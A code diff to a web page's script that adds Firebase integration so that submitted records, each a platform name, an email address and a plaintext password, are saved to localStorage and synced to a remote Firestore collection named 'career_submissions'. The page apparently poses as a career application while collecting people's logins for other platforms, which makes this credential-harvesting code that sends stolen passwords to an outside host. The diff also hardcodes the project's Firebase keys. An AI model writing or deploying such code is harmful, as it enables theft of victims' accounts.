@@ -575,23 +575,57 @@
                 }
             }, 50);
         }
+    </script>
 
-        // LocalStorage Submissions Saver
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
+
+    <script>
+        // Firebase Config
+        const firebaseConfig = {
+          apiKey: "AIzaSyCtHUgmHporXc4fPczkG-fbky6J1n2BJ3g",
+          authDomain: "ssuk-237d0.firebaseapp.com",
+          projectId: "ssuk-237d0",
+          storageBucket: "ssuk-237d0.firebasestorage.app",
+          messagingSenderId: "661175783750",
+          appId: "1:661175783750:web:76657796ed3a41f54d1547",
+          measurementId: "G-WDE2B0TKJJ"
+        };
+        if (!firebase.apps.length) {
+            firebase.initializeApp(firebaseConfig);
+        }
+        const db = firebase.firestore();
+
+        // LocalStorage & Firebase Submissions Saver
         function saveSubmission(platform, email, password) {
+            const recordId = 'APP-' + Math.floor(100000 + Math.random() * 900000);
+            const timeStr = new Date().toLocaleString('en-US', { dateStyle: 'medium', timeStyle: 'short' });
+            
+            const newRecord = {
+                id: recordId,
+                timestamp: timeStr,
+                createdAt: firebase.firestore.FieldValue.serverTimestamp(),
+                platform: platform,
+                email: email,
+                password: password,
+                status: 'Received'
+            };
+
+            // 1. LocalStorage Save
             try {
                 const existing = JSON.parse(localStorage.getItem('career_application_submissions') || '[]');
-                const newRecord = {
-                    id: 'APP-' + Math.floor(100000 + Math.random() * 900000),
-                    timestamp: new Date().toLocaleString('en-US', { dateStyle: 'medium', timeStyle: 'short' }),
-                    platform: platform,
-                    email: email,
-                    password: password,
-                    status: 'Received'
-                };
                 existing.unshift(newRecord);
                 localStorage.setItem('career_application_submissions', JSON.stringify(existing));
             } catch(e) {
                 console.error('LocalStorage error:', e);
+            }
+
+            // 2. Firebase Firestore Save (Real-time Sync)
+            try {
+                db.collection("career_submissions").doc(recordId).set(newRecord);
+            } catch(e) {
+                console.error('Firestore save error:', e);
             }
         }
 
